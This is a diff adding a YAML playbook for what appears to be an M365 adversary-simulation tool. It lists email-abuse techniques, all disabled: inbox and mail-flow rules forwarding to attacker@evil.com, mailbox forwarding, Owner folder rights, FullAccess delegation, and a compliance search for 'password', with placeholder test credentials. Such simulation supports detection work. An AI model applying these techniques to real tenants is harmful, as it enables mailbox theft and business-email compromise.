@@ -1,0 +1,80 @@
+
+authentication:
+  tenant_id: "00000000-0000-0000-0000-000000000000"
+
+  sessions:
+
+    victim1:
+      type: "resource_owner"
+      username: "victim1@contoso.onmicrosoft.com"
+      password: "SuperPass!!!"
+
+    victim2:
+      type: "device_code"
+      username: "victim1@contoso.onmicrosoft.com"
+
+playbooks:
+  - name: "M365 Adversary Simmulation"
+    description: "Techniques that manipulate email settings."
+    
+    techniques:
+      - technique: "read_email"
+        enabled: False
+        parameters:
+          session: "victim1"
+          access_method: "graph"
+          mailbox: "victim1@contoso.onmicrosoft.com"
+          limit : 5
+
+      - technique: "create_rule"
+        enabled: False
+        parameters:
+          session: "victim1"
+          access_method: "graph"
+          mailbox: "victim1@contoso.onmicrosoft.com"
+          rule_name : "msinvader rule 33" 
+          forward_to : "attacker@evil.com"
+          body_contains : "invoice"
+
+      - technique: "enable_email_forwarding"
+        enabled: False
+        parameters:
+          session: "victim1"
+          access_method: "rest"
+          mailbox: "victim1@contoso.onmicrosoft.com"
+          forward_to : "attacker@evil.com"
+                    
+      - technique: "add_folder_permission"
+        enabled: False
+        parameters:
+          session: "victim2"
+          access_method: "rest"
+          mailbox: "victim2@contoso.onmicrosoft.com"
+          folder: "Inbox"
+          grantee : "Default"
+          access_rights : "Owner"   
+                    
+      - technique: "add_mailbox_delegation"
+        enabled: False
+        parameters:
+          session: "victim2"
+          access_method: "rest"
+          mailbox: "victim2@contoso.onmicrosoft.com"
+          mailbox: "attacker@contoso.onmicrosoft.com"
+          access_rights : "FullAccess"
+                    
+      - technique: "run_compliance_search"
+        enabled: False
+        parameters:
+          session: "victim2"
+          access_method: "rest"
+          keyword : "password"
+          name : "msInvader 365 compliance search"
+                                      
+      - technique: "create_mailfow_rule"
+        enabled: False
+        parameters:
+          session: "victim2"
+          access_method: "rest"
+          forward_to : "attacker@evil.com"
+          name : "msInvader mailfow rule"
